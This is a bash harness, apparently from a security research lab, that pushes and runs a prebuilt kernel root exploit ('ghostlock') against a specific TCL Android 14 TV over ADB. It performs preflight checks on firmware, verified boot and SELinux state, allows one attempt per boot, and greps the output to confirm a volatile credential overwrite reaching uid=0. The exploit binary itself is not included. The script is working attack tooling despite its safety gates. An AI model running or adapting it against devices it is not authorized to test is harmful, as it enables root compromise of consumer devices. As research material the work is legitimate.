#!/bin/bash
set -euo pipefail

PORT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
BUILD="$PORT/build/android34"
: "${ADB_TARGET:?Set ADB_TARGET to the authorized TV serial}"
ADB_VENDOR_KEYS=${ADB_VENDOR_KEYS:-${HOME}/.android/adbkey}
LAB_ROOT=${LAB_ROOT:-/lab}
STAMP=$(date -u +%Y%m%dT%H%M%SZ)
LOG_DIR=${LIVE_LOG_DIR:-$LAB_ROOT/10_LOGS/live-newselect-root-$STAMP}
ADB=${ADB:-$(command -v adb)}
export ADB_VENDOR_KEYS

ROOT_NAME=ghostlock-v643-newselect-proof
HELPER_NAME=tcl-v643-newselect-helper-proof
ROOT_REMOTE=/data/local/tmp/$ROOT_NAME
HELPER_REMOTE=/data/local/tmp/$HELPER_NAME
EXPECTED_ROOT=9e3ae6467d2e888cb63e9c11dd444092d146dea500b226afd2e1da6b31edb6cf
EXPECTED_HELPER=4ca5692192b0a7598243f5070adf1e676ccd943aad4a292579ea69d38bbf1019

mkdir -p "$LOG_DIR"
exec > >(tee -a "$LOG_DIR/session.log") 2>&1

printf 'LIVE_NEWSELECT start=%s target=%s\n' "$STAMP" "$ADB_TARGET"
test "$(sha256sum "$BUILD/ghostlock-tcl-v643-lab" | awk '{print $1}')" = "$EXPECTED_ROOT"
test "$(sha256sum "$BUILD/tcl-v643-mcast-helper" | awk '{print $1}')" = "$EXPECTED_HELPER"

"$ADB" -s "$ADB_TARGET" get-state | grep -Fx device
state=$("$ADB" -s "$ADB_TARGET" shell '
  printf "%s|%s|%s|%s|%s|%s|%s|%s|%s" \
    "$(getprop ro.software.version_id)" "$(uname -r)" \
    "$(getprop ro.build.version.release)" "$(getprop sys.boot_completed)" \
    "$(getprop ro.boot.verifiedbootstate)" \
    "$(getprop ro.boot.vbmeta.device_state)" \
    "$(getprop ro.boot.veritymode)" "$(getenforce)" \
    "$(grep -Ec "^(kernelsu|resukisu|kowsu) " /proc/modules 2>/dev/null || true)"' \
  | tr -d '\r')
expected='V8-T653T01-LF1V643|5.15.180-android14-11|14|1|green|locked|enforcing|Enforcing|0'
if [ "$state" != "$expected" ]; then
  printf 'REFUSED unexpected_state=%s\n' "$state" >&2
  exit 3
fi

uptime_raw=$("$ADB" -s "$ADB_TARGET" shell cat /proc/uptime \
  | tr -d '\r' | awk '{print $1}')
uptime_s=${uptime_raw%%.*}
case "$uptime_s" in
  ''|*[!0-9]*) printf 'REFUSED invalid uptime=%s\n' "$uptime_raw" >&2; exit 3 ;;
esac
if [ "$uptime_s" -gt 900 ]; then
  printf 'REFUSED boot is not fresh: uptime=%ss\n' "$uptime_s" >&2
  exit 3
fi

boot_id=$("$ADB" -s "$ADB_TARGET" shell cat /proc/sys/kernel/random/boot_id | tr -d '\r\n')
printf 'LIVE_NEWSELECT preflight state=%s uptime=%s boot_id=%s\n' \
  "$state" "$uptime_raw" "$boot_id"

gate=/data/local/tmp/.tcl_newselect_attempt_$boot_id
gate_result=$("$ADB" -s "$ADB_TARGET" shell \
  "if mkdir '$gate' 2>/dev/null; then echo ROOT_GATE_OK; else echo ROOT_GATE_EXISTS; fi" \
  | tr -d '\r')
if [ "$gate_result" != ROOT_GATE_OK ]; then
  printf 'REFUSED attempt gate already consumed: %s\n' "$gate" >&2
  exit 4
fi
printf 'LIVE_NEWSELECT gate=%s\n' "$gate"

"$ADB" -s "$ADB_TARGET" push "$BUILD/ghostlock-tcl-v643-lab" "$ROOT_REMOTE"
"$ADB" -s "$ADB_TARGET" push "$BUILD/tcl-v643-mcast-helper" "$HELPER_REMOTE"
"$ADB" -s "$ADB_TARGET" shell chmod 755 "$ROOT_REMOTE" "$HELPER_REMOTE"

device_hashes=$("$ADB" -s "$ADB_TARGET" shell \
  "sha256sum '$ROOT_REMOTE' '$HELPER_REMOTE'" | tr -d '\r')
printf '%s\n' "$device_hashes"
printf '%s\n' "$device_hashes" | grep -Fqx "$EXPECTED_ROOT  $ROOT_REMOTE"
printf '%s\n' "$device_hashes" | grep -Fqx "$EXPECTED_HELPER  $HELPER_REMOTE"

"$ADB" -s "$ADB_TARGET" shell "$HELPER_REMOTE --selftest" | tee "$LOG_DIR/helper-selftest.log"
"$ADB" -s "$ADB_TARGET" shell "$ROOT_REMOTE --capture-witness-preflight" \
  | tee "$LOG_DIR/pagemap-preflight.log"

printf 'LIVE_NEWSELECT LAUNCH one volatile credential write; no SELinux write, module or exec\n'
monitor_stop="$LOG_DIR/adb-monitor.stop"
monitor_lost="$LOG_DIR/adb-was-lost"
monitor_pid=0
stop_monitor() {
  if [ "$monitor_pid" -gt 0 ]; then
    touch "$monitor_stop"
    wait "$monitor_pid" 2>/dev/null || true
    monitor_pid=0
  fi
}
trap stop_monitor EXIT INT TERM
(
  while [ ! -e "$monitor_stop" ]; do
    now=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    transport=$(timeout 3 "$ADB" -s "$ADB_TARGET" get-state 2>/dev/null || true)
    printf '%s state=%s\n' "$now" "${transport:-unavailable}"
    if [ "$transport" != device ]; then
      touch "$monitor_lost"
    fi
    sleep 1
  done
) > "$LOG_DIR/adb-monitor.log" 2>&1 &
monitor_pid=$!

set +e
"$ADB" -s "$ADB_TARGET" shell \
  "cd /data/local/tmp && timeout 600 env \
TCL_CAPTURE_FORCE_PERF=1 \
TCL_PERF_WITNESS=1 \
TCL_PERF_WITNESS_ATTEMPTS=5 \
TCL_PERF_RING_LOOPS=20000 \
TCL_W2_ATTEMPTS=1 TCL_REUSE_ATTEMPTS=1 \
TCL_MCAST_HELPER=$HELPER_REMOTE \
GHOST_SELINUX=0 GHOST_EXEC=0 GHOST_REBOOT=0 GHOST_MINIMAL=1 \
FOPS_MAX_ATTEMPTS=1 CRED_ATTEMPTS=1 KSNITCH_VERBOSE=0 \
$ROOT_REMOTE --cred" 2>&1 | tee "$LOG_DIR/root.log"
root_rc=${PIPESTATUS[0]}
set -e
stop_monitor
trap - EXIT INT TERM
adb_was_lost=0
if [ -e "$monitor_lost" ]; then
  adb_was_lost=1
fi
printf 'LIVE_NEWSELECT adb_shell_rc=%d\n' "$root_rc"
printf 'LIVE_NEWSELECT adb_was_lost=%d\n' "$adb_was_lost"

connected=0
for _ in $(seq 1 90); do
  if timeout 4 "$ADB" -s "$ADB_TARGET" get-state 2>/dev/null | grep -Fqx device; then
    connected=1
    break
  fi
  timeout 5 "$ADB" connect "$ADB_TARGET" >/dev/null 2>&1 || true
  sleep 2
done
if [ "$connected" -ne 1 ]; then
  printf 'LIVE_NEWSELECT BLOCKED: ADB did not return after the attempt\n' >&2
  exit 6
fi

after_boot=$("$ADB" -s "$ADB_TARGET" shell cat /proc/sys/kernel/random/boot_id | tr -d '\r\n')
post_state=$("$ADB" -s "$ADB_TARGET" shell '
  printf "boot=%s selinux=%s verified=%s vbmeta=%s verity=%s modules=%s" \
    "$(getprop sys.boot_completed)" "$(getenforce)" \
    "$(getprop ro.boot.verifiedbootstate)" \
    "$(getprop ro.boot.vbmeta.device_state)" \
    "$(getprop ro.boot.veritymode)" \
    "$(grep -Ec "^(kernelsu|resukisu|kowsu) " /proc/modules 2>/dev/null || true)"' \
  | tr -d '\r')
printf 'LIVE_NEWSELECT after_boot=%s post_state=%s\n' "$after_boot" "$post_state"

if [ "$after_boot" != "$boot_id" ]; then
  "$ADB" -s "$ADB_TARGET" shell \
    'printf "bootreason=%s sys_last=%s\n" "$(getprop ro.boot.bootreason)" "$(getprop sys.boot.reason.last)"; ls -l /sys/fs/pstore 2>&1 || true' \
    | tee "$LOG_DIR/reboot-state.log"
  printf 'LIVE_NEWSELECT FAIL: kernel rebooted during the attempt\n' >&2
  exit 7
fi

if [ "$adb_was_lost" -eq 1 ]; then
  printf 'LIVE_NEWSELECT SAFETY: ADB was lost but returned on the same boot; rebooting now\n' >&2
  "$ADB" -s "$ADB_TARGET" reboot
  safety_ready=0
  for _ in $(seq 1 120); do
    timeout 5 "$ADB" connect "$ADB_TARGET" >/dev/null 2>&1 || true
    if timeout 4 "$ADB" -s "$ADB_TARGET" get-state 2>/dev/null | grep -Fqx device; then
      complete=$("$ADB" -s "$ADB_TARGET" shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
      if [ "$complete" = 1 ]; then
        safety_ready=1
        break
      fi
    fi
    sleep 2
  done
  if [ "$safety_ready" -eq 1 ]; then
    safety_boot=$("$ADB" -s "$ADB_TARGET" shell cat /proc/sys/kernel/random/boot_id | tr -d '\r\n')
    printf 'LIVE_NEWSELECT SAFETY_REBOOT_OK old_boot=%s new_boot=%s\n' "$boot_id" "$safety_boot"
  else
    printf 'LIVE_NEWSELECT SAFETY_REBOOT_SENT but ADB did not return in time\n' >&2
  fi
  sha256sum "$LOG_DIR"/*.log > "$LOG_DIR/SHA256SUMS"
  exit 8
fi

grep -Eq 'TCL capture witness: method=perf-regs .*block=[0-9]+ pfn_reference=-1 verdict=1' \
  "$LOG_DIR/root.log"
grep -q 'carrier_ret=0 carrier_errno=0' "$LOG_DIR/root.log"
grep -q 'TCL split: erase=1 handler=1 cleanup=1 status=0 failures=0' \
  "$LOG_DIR/root.log"
grep -q '=== ROOT: uid=0 hits=1/1 ===' "$LOG_DIR/root.log"
test "$post_state" = 'boot=1 selinux=Enforcing verified=green vbmeta=locked verity=enforcing modules=0'

sha256sum "$LOG_DIR"/*.log > "$LOG_DIR/SHA256SUMS"
printf 'LIVE_NEWSELECT PASS: volatile UID 0 proved; process exited; security state unchanged\n'
